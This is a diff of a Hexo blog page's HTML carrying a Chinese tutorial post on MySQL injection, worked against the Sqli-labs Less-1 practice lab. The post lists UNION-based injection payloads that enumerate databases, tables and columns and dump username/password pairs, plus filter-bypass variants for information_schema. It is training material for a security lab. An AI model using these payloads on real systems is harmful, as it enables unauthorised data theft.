@@ -2,19 +2,23 @@
 <html>
 <head><meta name="generator" content="Hexo 3.8.0">
     <meta charset="utf-8">
-<title>Archives: 2019/7 - lsadaharu</title>
+<title>lsadaharu</title>
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
 
 
-    <meta property="og:type" content="website">
+    <meta name="description" content="Mysql注入笔记(三) 从一个简单的get注入学习注入流程。以Sqli-labs第一关演示1.单双引号判断是否有报错： 1127.0.0.1/sql-lab/Less-1/?id=1%27 报错信息：1You have an error in your SQL syntax; check the manual that corresponds to your MySQL server versi">
+<meta property="og:type" content="article">
 <meta property="og:title" content="lsadaharu">
-<meta property="og:url" content="http://yoursite.com/archives/2019/07/index.html">
+<meta property="og:url" content="http://yoursite.com/2019/08/04/sql注入_mysql_3/index.html">
 <meta property="og:site_name" content="lsadaharu">
+<meta property="og:description" content="Mysql注入笔记(三) 从一个简单的get注入学习注入流程。以Sqli-labs第一关演示1.单双引号判断是否有报错： 1127.0.0.1/sql-lab/Less-1/?id=1%27 报错信息：1You have an error in your SQL syntax; check the manual that corresponds to your MySQL server versi">
 <meta property="og:locale" content="default">
 <meta property="og:image" content="http://yoursite.com/images/og_image.png">
+<meta property="og:updated_time" content="2019-08-04T01:34:48.260Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="lsadaharu">
+<meta name="twitter:description" content="Mysql注入笔记(三) 从一个简单的get注入学习注入流程。以Sqli-labs第一关演示1.单双引号判断是否有报错： 1127.0.0.1/sql-lab/Less-1/?id=1%27 报错信息：1You have an error in your SQL syntax; check the manual that corresponds to your MySQL server versi">
 <meta name="twitter:image" content="http://yoursite.com/images/og_image.png">
 
 
@@ -89,7 +93,7 @@
         <div class="navbar-brand is-flex-center">
             <a class="navbar-item navbar-logo" href="/">
             
-                <img src="/images/logo.svg" alt="lsadaharu" height="28">
+                <img src="/images/logo.svg" alt height="28">
             
             </a>
         </div>
@@ -134,46 +138,118 @@
     <section class="section">
         <div class="container">
             <div class="columns">
-                <div class="column is-8-tablet is-8-desktop is-6-widescreen has-order-2 column-main">
-
-<div class="card widget">
-    <div class="card-content">
-        <h3 class="tag is-link">
-        July 2019
-        </h3>
-        <div class="timeline">
+                <div class="column is-8-tablet is-8-desktop is-6-widescreen has-order-2 column-main"><div class="card">
+    
+    <div class="card-content article ">
         
-            <article class="media">
+        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
+            <div class="level-left">
+                <time class="level-item has-text-grey" datetime="2019-08-04T02:35:59.247Z">2019-08-04</time>
                 
-                <div class="media-content">
-                    <div class="content">
-                        <time class="has-text-grey is-size-7 is-block is-uppercase" datetime="2019-07-28T02:22:05.419Z">2019-07-28</time>
-                        <a href="/2019/07/28/HTTP协议基础/" class="has-link-black-ter is-size-6"></a>
-                        <div class="level article-meta is-mobile">
-                            <div class="level-left">
-                                
-                            </div>
-                        </div>
-                    </div>
-                </div>
-            </article>
-        
-            <article class="media">
                 
-                <div class="media-content">
-                    <div class="content">
-                        <time class="has-text-grey is-size-7 is-block is-uppercase" datetime="2019-07-27T04:47:06.646Z">2019-07-27</time>
-                        <a href="/2019/07/27/windows与linux命令/" class="has-link-black-ter is-size-6"></a>
-                        <div class="level article-meta is-mobile">
-                            <div class="level-left">
-                                
-                            </div>
-                        </div>
-                    </div>
-                </div>
-            </article>
-        
+                <span class="level-item has-text-grey">
+                    
+                    
+                    3 minutes read (About 492 words)
+                </span>
+                
+                
+            </div>
         </div>
+        
+        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
+            
+                
+            
+        </h1>
+        <div class="content">
+            <h1 id="Mysql注入笔记-三"><a href="#Mysql注入笔记-三" class="headerlink" title="Mysql注入笔记(三)"></a>Mysql注入笔记(三)</h1><hr>
+<h2 id="从一个简单的get注入学习注入流程。"><a href="#从一个简单的get注入学习注入流程。" class="headerlink" title="从一个简单的get注入学习注入流程。"></a>从一个简单的get注入学习注入流程。</h2><h3 id="以Sqli-labs第一关演示"><a href="#以Sqli-labs第一关演示" class="headerlink" title="以Sqli-labs第一关演示"></a>以Sqli-labs第一关演示</h3><p>1.单双引号判断是否有报错：</p>
+<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1/sql-lab/Less-1/?id=1%27</span><br></pre></td></tr></table></figure>
+<p>报错信息：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error <span class="hljs-keyword">in</span> your SQL syntax; check the manual that corresponds to your MySQL server version <span class="hljs-keyword">for</span> the right syntax to use near <span class="hljs-string">''</span>1<span class="hljs-string">''</span> LIMIT 0,1<span class="hljs-string">' at line 1</span></span><br></pre></td></tr></table></figure></p>
+<p>从报错信息判断出单引号没有闭合，所以造成错误，同时得知后面有limit 0,1的数据库取值方式，可通过闭合单引号后注释来绕过。<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1/sqli/Less-1/?id=2<span class="hljs-string">' -- +</span></span><br></pre></td></tr></table></figure></p>
+<ol start="2">
+<li>查询字段数使用order by+判断的字段数,使用二分法来减少判断数。</li>
+<li>查询数据库名</li>
+</ol>
+<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1/sqli/Less-1/?id=-2<span class="hljs-string">' union select 1,schema_name,3 from information_schema.schemata limit 2,1 -- +</span></span><br></pre></td></tr></table></figure>
+<p>通过limit0,1 来控制前端的显示位的数据(从第0条取一条)，所以上面的语句是从第三条取一条，如果过滤了逗号，可用分页的方式取值，如1 offset 1意为从第一条开始选一条。如果数据数量多时，可以使用group_concat()函数来聚合库名,此时不用limit来取值。如<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1/sqli/Less-1/?id=-2<span class="hljs-string">' union select 1,group_conat(schema_name),3 from information_schema.schemata -- +</span></span><br></pre></td></tr></table></figure></p>
+<ol start="4">
+<li>查询表名</li>
+</ol>
+<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1/sqli/Less-1/?id=-2<span class="hljs-string">' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='</span>security<span class="hljs-string">' -- +</span></span><br></pre></td></tr></table></figure>
+<p>如直接查询当前库的表名也可以写成table_schema=database()，若想避免单引号可转换为hex形式table_schema=0x7365637572697479</p>
+<ol start="5">
+<li>查询列名</li>
+</ol>
+<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1/sqli/Less-1/?id=-2<span class="hljs-string">' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='</span>security<span class="hljs-string">' -- +</span></span><br></pre></td></tr></table></figure>
+<ol start="6">
+<li>查询相关字段</li>
+</ol>
+<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1/sqli/Less-1/?id=-2<span class="hljs-string">' union select 1,group_concat(username,0x7e,password),3 from users -- +</span></span><br></pre></td></tr></table></figure>
+<ol start="7">
+<li>在使用infomation_schema.schemata等表查询时若被过滤了可以用以下方式绕过</li>
+</ol>
+<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">`information_schema`.`schemata `  </span><br><span class="line">information_schema/**/.schemata</span><br><span class="line">information_schema/*!*/.schemata</span><br><span class="line">information_schema%0a.schemata</span><br></pre></td></tr></table></figure>
+<hr>
+<h2 id="学习总结别人的思路和方法，举一反三从实战中总结自己的思路和方法。"><a href="#学习总结别人的思路和方法，举一反三从实战中总结自己的思路和方法。" class="headerlink" title="学习总结别人的思路和方法，举一反三从实战中总结自己的思路和方法。"></a>学习总结别人的思路和方法，举一反三从实战中总结自己的思路和方法。</h2><hr>
+<h3 id="参考了404大佬的文档-链接-https-github-com-aleenzz-MYSQL-SQL-BYPASS-WIKI"><a href="#参考了404大佬的文档-链接-https-github-com-aleenzz-MYSQL-SQL-BYPASS-WIKI" class="headerlink" title="参考了404大佬的文档[链接]:https://github.com/aleenzz/MYSQL_SQL_BYPASS_WIKI"></a>参考了404大佬的文档[链接]:<a href="https://github.com/aleenzz/MYSQL_SQL_BYPASS_WIKI" target="_blank" rel="noopener">https://github.com/aleenzz/MYSQL_SQL_BYPASS_WIKI</a></h3>
+        </div>
+        
+        
+        
+    </div>
+</div>
+
+
+
+<div class="card">
+    <div class="card-content">
+        <h3 class="menu-label has-text-centered">Like this article? Support the author with</h3>
+        <div class="buttons is-centered">
+            
+                
+<div class="notification is-danger">
+    You forgot to set the <code>qrcode</code> for Alipay. Please set it in <code>_config.yml</code>.
+</div>
+
+                
+                
+<div class="notification is-danger">
+    You forgot to set the <code>qrcode</code> for Wechat. Please set it in <code>_config.yml</code>.
+</div>
+
+                
+                <!-- Visit https://www.paypal.com/donate/buttons/ to get your donate button -->
+
+<div class="notification is-danger">
+    You forgot to set the <code>business</code> and <code>currency_code</code> for Paypal. Please set it in <code>_config.yml</code>.
+</div>
+
+                
+                
+<div class="notification is-danger">
+    You forgot to set the <code>url</code> Patreon. Please set it in <code>_config.yml</code>.
+</div>
+
+                
+        </div>
+    </div>
+</div>
+
+
+
+<div class="card card-transparent">
+    <div class="level post-navigation is-flex-wrap is-mobile">
+        
+        
+        <div class="level-end">
+            <a class="level level-item has-link-grey  article-nav-next" href="/2019/08/03/sql注入_mysql_2/">
+                <span class="level-item"></span>
+                <i class="level-item fas fa-chevron-right"></i>
+            </a>
+        </div>
+        
     </div>
 </div>
 
@@ -702,7 +778,7 @@
             <div class="level-start has-text-centered-mobile">
                 <a class="footer-logo is-block has-mb-6" href="/">
                 
-                    <img src="/images/logo.svg" alt="lsadaharu" height="28">
+                    <img src="/images/logo.svg" alt height="28">
                 
                 </a>
                 <p class="is-size-7">
